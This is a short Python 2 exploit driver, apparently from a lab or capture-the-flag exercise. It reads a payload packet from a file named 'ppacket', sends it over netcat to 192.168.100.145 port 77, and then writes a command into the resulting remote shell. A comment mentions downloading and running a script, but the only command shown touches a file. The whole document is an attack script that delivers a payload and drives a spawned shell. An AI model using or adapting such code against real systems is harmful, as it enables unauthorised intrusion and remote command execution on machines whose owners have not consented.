#!/usr/bin/env python2
import os
import time
import subprocess as sp

poison = None
with open('ppacket') as poison_file:
	poison = poison_file.read()

# parse CC file
print(poison)

# run payload packet through netcat, then wait a little for it to be processed
nc = sp.Popen(['nc', '192.168.100.145', '77'], stdin=sp.PIPE, stdout=sp.PIPE)
nc.stdin.write(poison)
nc.stdin.flush()
time.sleep(1)

# tell spawned shell to download the python script and run it
nc.stdin.write('touch /blargh\n')
nc.stdin.flush()

# screw around
